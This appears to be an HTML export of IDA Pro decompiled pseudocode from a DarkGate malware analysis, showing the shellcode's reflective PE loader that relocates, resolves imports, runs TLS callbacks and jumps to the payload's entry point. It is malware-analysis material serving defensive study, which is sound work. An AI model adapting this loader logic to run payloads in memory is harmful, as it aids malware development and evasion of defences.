<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>IDA - darkgate_sc.bin.idb (darkgate_sc.bin) C:\Users\Administrator\Desktop\SANS_ISC\darkgate_artifacts\darkgate_sc.bin.idb</title>
</head>
<body class="c41">
<span style="white-space: pre; font-family: Cascadia Code,monospace;" class="c1 c41">
<span class="c33">unsigned int __stdcall drg_shellcode_loader</span><span class="c9">(</span><span class="c33">PE_BASE arg_dgDelphiLoaderBaseAddr</span><span class="c9">)
{
  </span><span class="c23">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]

  </span><span class="c37">if </span><span class="c9">( !</span><span class="c8">drg_resolve_LoadLibraryA_GetProcAddress</span><span class="c9">(&amp;</span><span class="c24">mw_resolved_api</span><span class="c9">) )
  {
    </span><span class="c37">return </span><span class="c9">-</span><span class="c32">1u</span><span class="c9">;
  </span><span class="c32"></span><span class="c9">}
  </span><span class="c37">if </span><span class="c9">( </span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.dos_hdr-&gt;e_magic != IMAGE_DOS_SIGNATURE )
  {
    </span><span class="c37">return </span><span class="c9">-</span><span class="c32">2u</span><span class="c9">;
  </span><span class="c32"></span><span class="c9">}
  </span><span class="c24">pNtHeaders </span><span class="c9">= (</span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.baseAddress + </span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.dos_hdr-&gt;e_lfanew);
  </span><span class="c37">if </span><span class="c9">( </span><span class="c24">pNtHeaders</span><span class="c9">-&gt;Signature != IMAGE_NT_SIGNATURE )
  {
    </span><span class="c37">return </span><span class="c9">-</span><span class="c32">2u</span><span class="c9">;
  </span><span class="c32"></span><span class="c9">}
  </span><span class="c24">v3 </span><span class="c9">= </span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.dos_hdr-&gt;e_res[</span><span class="c32">2</span><span class="c9">];
  </span><span class="c37">switch </span><span class="c9">( </span><span class="c24">v3 </span><span class="c9">)
  {
    </span><span class="c37">case </span><span class="c32">2</span><span class="c9">:
      </span><span class="c37">return </span><span class="c32">0x4DF</span><span class="c9">;
    </span><span class="c37">case </span><span class="c32">3</span><span class="c9">:
      </span><span class="c37">if </span><span class="c9">( (</span><span class="c24">pNtHeaders</span><span class="c9">-&gt;FileHeader.Characteristics &amp; IMAGE_FILE_DLL) == </span><span class="c32">0 </span><span class="c9">)
      {
        </span><span class="c37">return </span><span class="c32">0x4DF</span><span class="c9">;
      </span><span class="c32"></span><span class="c9">}
      </span><span class="c24">result </span><span class="c9">= ((</span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.baseAddress + </span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.AddressOfEntryPoint))(
                 </span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.baseAddress,
                 </span><span class="c32">0</span><span class="c9">,
                 </span><span class="c32">0</span><span class="c9">);
      </span><span class="c37">if </span><span class="c9">( </span><span class="c24">result </span><span class="c9">)
      {
        </span><span class="c8">LOBYTE</span><span class="c9">(</span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.dos_hdr-&gt;e_res[</span><span class="c32">2</span><span class="c9">]) = </span><span class="c32">2</span><span class="c9">;
      </span><span class="c32"></span><span class="c9">}
      </span><span class="c37">return </span><span class="c24">result</span><span class="c9">;
    </span><span class="c37">case </span><span class="c32">0</span><span class="c9">:
      </span><span class="c37">if </span><span class="c9">( !</span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress )
      {
        </span><span class="c37">return </span><span class="c9">-</span><span class="c32">3u</span><span class="c9">;
      </span><span class="c32"></span><span class="c9">}
      </span><span class="c37">if </span><span class="c9">( !</span><span class="c8">drg_perform_base_relocate</span><span class="c9">(
              &amp;</span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,
              </span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">,
              </span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.ImageBase) )
</span><span class="c62">      <span class="c9">{                                                                                      </span></span>
        <span class="c37">return </span><span class="c9">-</span><span class="c32">4u</span><span class="c9">;
</span><span class="c62">      </span><span class="c32"></span><span class="c62"><span class="c9">}                                                                                      </span></span>
      <span class="c37">if </span><span class="c9">( </span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
        &amp;&amp; !</span><span class="c8">drg_build_import_table</span><span class="c9">(
              </span><span class="c24">mw_resolved_api</span><span class="c9">.LoadLibraryA,
              </span><span class="c24">mw_resolved_api</span><span class="c9">.GetProcAddress,
              </span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.DataDirectory[IMAGE_FILE_IMPORT_DIRECTORY].VirtualAddress,
              </span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.DataDirectory[IMAGE_FILE_IMPORT_DIRECTORY].Size,
              </span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">) )
      {
        </span><span class="c37">return </span><span class="c9">-</span><span class="c32">5u</span><span class="c9">;
      </span><span class="c32"></span><span class="c9">}
      </span><span class="c37">if </span><span class="c9">( </span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress )
      {
        </span><span class="c8">drg_exec_tls_callbacks</span><span class="c9">(
          &amp;</span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS],
          </span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">);
      </span><span class="c9"></span><span class="c9">}
      </span><span class="c37">break</span><span class="c9">;
  </span><span class="c37"></span><span class="c9">}
  </span><span class="c8">LOBYTE</span><span class="c9">(</span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.dos_hdr-&gt;e_res[</span><span class="c32">2</span><span class="c9">]) = </span><span class="c32">1</span><span class="c9">;
  </span><span class="c24">mw_EntryPointAddr </span><span class="c9">= (</span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.baseAddress + </span><span class="c24">pNtHeaders</span><span class="c9">-&gt;OptionalHeader.AddressOfEntryPoint);
  </span><span class="c8">LOBYTE</span><span class="c9">(</span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.dos_hdr-&gt;e_res[</span><span class="c32">2</span><span class="c9">]) = </span><span class="c32">2</span><span class="c9">;
  </span><span class="c37">if </span><span class="c9">( (</span><span class="c24">pNtHeaders</span><span class="c9">-&gt;FileHeader.Characteristics &amp; IMAGE_FILE_DLL) == </span><span class="c32">0 </span><span class="c9">)
  {
    </span><span class="c37">return </span><span class="c24">mw_EntryPointAddr</span><span class="c9">();
  </span><span class="c9"></span><span class="c9">}
  </span><span class="c24">result </span><span class="c9">= (</span><span class="c24">mw_EntryPointAddr</span><span class="c9">)(</span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.baseAddress, </span><span class="c32">1</span><span class="c9">, </span><span class="c32">0</span><span class="c9">);
  </span><span class="c37">if </span><span class="c9">( </span><span class="c24">result </span><span class="c9">)
  {
    </span><span class="c8">LOBYTE</span><span class="c9">(</span><span class="c24">arg_dgDelphiLoaderBaseAddr</span><span class="c9">.dos_hdr-&gt;e_res[</span><span class="c32">2</span><span class="c9">]) = </span><span class="c32">3</span><span class="c9">;
  </span><span class="c32"></span><span class="c9">}
  </span><span class="c37">return </span><span class="c24">result</span><span class="c9">;
</span><span class="c24"></span><span class="c9">}
</span>
</span><style type="text/css">
/* line-fg-default */
.c1 { color: #D20000; }
/* line-bg-default */
.c41 { background-color: black; }
/* line-fg-register-name */
.c33 { color: #8080FF; }
/* line-fg-punctuation */
.c9 { color: silver; }
/* line-fg-hidden */
.c23 { color: #FFD200; }
/* line-fg-keyword */
.c32 { color: #AFAFAF; }
/* line-fg-code-name */
.c37 { color: #FF0082; }
/* line-fg-demangled-name */
.c8 { color: #FFEBB4; }
/* line-fg-libfunc */
.c24 { color: aqua; }
/* user-defined-00646464 */
.c62 { background-color: rgba(100, 100, 100, 0.000000); }
</style></body></html>
